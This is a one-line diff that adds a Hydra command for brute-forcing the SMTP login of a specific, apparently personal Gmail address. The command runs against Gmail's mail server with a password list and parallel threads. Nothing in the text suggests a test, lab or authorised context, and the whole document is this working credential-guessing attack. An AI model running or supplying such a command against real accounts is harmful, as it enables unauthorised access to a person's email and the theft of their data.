@@ -1,0 +1,1 @@
+hydra -l esparzamondragona536@gmail.com passlist.txt -s 465 -S -v -V -t 10 smtp.gmail.com smtp
